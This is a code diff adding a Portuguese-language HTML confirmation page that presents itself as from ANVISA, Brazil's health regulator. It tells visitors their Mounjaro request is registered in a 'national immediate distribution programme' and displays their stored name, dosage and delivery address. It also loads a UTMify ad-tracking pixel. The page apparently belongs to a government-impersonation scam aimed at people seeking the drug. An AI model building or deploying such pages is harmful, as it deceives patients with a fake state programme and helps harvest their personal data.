@@ -1,0 +1,256 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Solicitação Confirmada - ANVISA</title>
+    
+    <!-- UTMify Pixel -->
+    <script>
+      window.pixelId = "691e4e1d6076486a2bdde991";
+      var a = document.createElement("script");
+      a.setAttribute("async", "");
+      a.setAttribute("defer", "");
+      a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+      document.head.appendChild(a);
+    </script>
+
+    <link rel="stylesheet" href="../index_files/rawline-fonts.css">
+    <link rel="stylesheet" href="../index_files/all.min.css">
+    
+    <style>
+        @font-face {
+            font-family: 'Rawline';
+            src: url("../index_files/rawline-fonts.css") format('woff2');
+            font-weight: 400;
+            font-style: normal;
+        }
+        
+        body {
+            font-family: 'Rawline', sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f9fafb;
+        }
+        
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 40px 20px;
+        }
+        
+        .success-card {
+            background: white;
+            border-radius: 12px;
+            padding: 48px 32px;
+            text-align: center;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+        }
+        
+        .success-icon {
+            width: 80px;
+            height: 80px;
+            margin: 0 auto 24px;
+            background: #dcfce7;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .success-icon i {
+            font-size: 40px;
+            color: #16a34a;
+        }
+        
+        h1 {
+            font-size: 2rem;
+            color: #0c326f;
+            margin-bottom: 16px;
+        }
+        
+        .subtitle {
+            font-size: 1.125rem;
+            color: #6b7280;
+            margin-bottom: 32px;
+        }
+        
+        .protocol-box {
+            background: #eff6ff;
+            border: 2px dashed #1351b4;
+            border-radius: 8px;
+            padding: 24px;
+            margin: 32px 0;
+        }
+        
+        .protocol-label {
+            font-size: 0.875rem;
+            color: #6b7280;
+            text-transform: uppercase;
+            margin-bottom: 8px;
+        }
+        
+        .protocol-number {
+            font-size: 1.5rem;
+            font-weight: 700;
+            color: #1351b4;
+            font-family: monospace;
+        }
+        
+        .info-section {
+            text-align: left;
+            margin: 32px 0;
+            padding: 24px;
+            background: #f9fafb;
+            border-radius: 8px;
+        }
+        
+        .info-title {
+            font-size: 1.125rem;
+            font-weight: 600;
+            color: #1f2937;
+            margin-bottom: 16px;
+        }
+        
+        .info-list {
+            list-style: none;
+            padding: 0;
+            margin: 0;
+        }
+        
+        .info-list li {
+            padding: 8px 0;
+            padding-left: 28px;
+            position: relative;
+            color: #4b5563;
+            font-size: 0.9375rem;
+        }
+        
+        .info-list li:before {
+            content: "✓";
+            position: absolute;
+            left: 0;
+            color: #16a34a;
+            font-weight: bold;
+        }
+        
+        .btn-primary {
+            display: inline-block;
+            background: #1351b4;
+            color: white;
+            padding: 12px 32px;
+            border-radius: 8px;
+            text-decoration: none;
+            font-weight: 600;
+            margin-top: 24px;
+            transition: background 0.2s;
+        }
+        
+        .btn-primary:hover {
+            background: #0c326f;
+        }
+        
+        .footer-note {
+            margin-top: 32px;
+            padding-top: 24px;
+            border-top: 1px solid #e5e7eb;
+            font-size: 0.875rem;
+            color: #6b7280;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="success-card">
+            <div class="success-icon">
+                <i class="fas fa-check"></i>
+            </div>
+            
+            <h1>Solicitação Confirmada!</h1>
+            <p class="subtitle">
+                Sua solicitação de Mounjaro® foi registrada com sucesso no Programa Nacional de Distribuição Imediata.
+            </p>
+            
+            <div class="protocol-box">
+                <div class="protocol-label">Número do Protocolo</div>
+                <div class="protocol-number" id="protocolNumber">Carregando...</div>
+            </div>
+            
+            <div class="info-section">
+                <div class="info-title">
+                    <i class="fas fa-info-circle" style="color: #1351b4; margin-right: 8px;"></i>
+                    Próximos Passos
+                </div>
+                <ul class="info-list">
+                    <li>Você receberá um e-mail de confirmação com todos os detalhes da sua solicitação</li>
+                    <li>O medicamento será enviado para o endereço cadastrado em até 5 dias úteis</li>
+                    <li>A entrega será feita com embalagem refrigerada para garantir a qualidade</li>
+                    <li>Você poderá acompanhar o status do envio pelo e-mail cadastrado</li>
+                    <li>Em caso de dúvidas, entre em contato através do telefone 0800 642 9782</li>
+                </ul>
+            </div>
+            
+            <div class="info-section">
+                <div class="info-title">
+                    <i class="fas fa-box" style="color: #1351b4; margin-right: 8px;"></i>
+                    Informações do Pedido
+                </div>
+                <div id="orderInfo" style="color: #4b5563; font-size: 0.9375rem;">
+                    <!-- Será preenchido via JavaScript -->
+                </div>
+            </div>
+            
+            <a href="/" class="btn-primary">
+                <i class="fas fa-home" style="margin-right: 8px;"></i>
+                Voltar para o Início
+            </a>
+            
+            <div class="footer-note">
+                <p>
+                    <strong>Importante:</strong> Guarde este número de protocolo para futuras consultas.
+                    Ele será necessário para acompanhamento do pedido e retirada do medicamento.
+                </p>
+            </div>
+        </div>
+    </div>
+    
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            // Carregar dados do localStorage
+            try {
+                // Protocolo
+                const protocoloData = localStorage.getItem('protocoloValidacao');
+                if (protocoloData) {
+                    const protocolo = JSON.parse(protocoloData);
+                    document.getElementById('protocolNumber').textContent = 
+                        protocolo.numero || 'Não disponível';
+                }
+                
+                // Informações do pedido
+                const nomeCompleto = localStorage.getItem('nomeCompleto');
+                const dosagem = localStorage.getItem('selected_dosage') || '5mg';
+                const enderecoData = localStorage.getItem('endereco_form_data');
+                
+                let orderInfoHTML = '';
+                
+                if (nomeCompleto) {
+                    orderInfoHTML += `<p><strong>Nome:</strong> ${nomeCompleto}</p>`;
+                }
+                
+                orderInfoHTML += `<p><strong>Medicamento:</strong> Mounjaro® (tirzepatida) ${dosagem}</p>`;
+                
+                if (enderecoData) {
+                    const endereco = JSON.parse(enderecoData);
+                    orderInfoHTML += `<p><strong>Endereço de Entrega:</strong> ${endereco.street || ''}, ${endereco.number || ''} - ${endereco.city || ''}, ${endereco.state || ''} - CEP: ${endereco.cep || ''}</p>`;
+                }
+                
+                document.getElementById('orderInfo').innerHTML = orderInfoHTML;
+                
+            } catch (error) {
+                console.error('Erro ao carregar dados:', error);
+                document.getElementById('protocolNumber').textContent = 'Erro ao carregar';
+            }
+        });
+    </script>
+</body>
+</html>
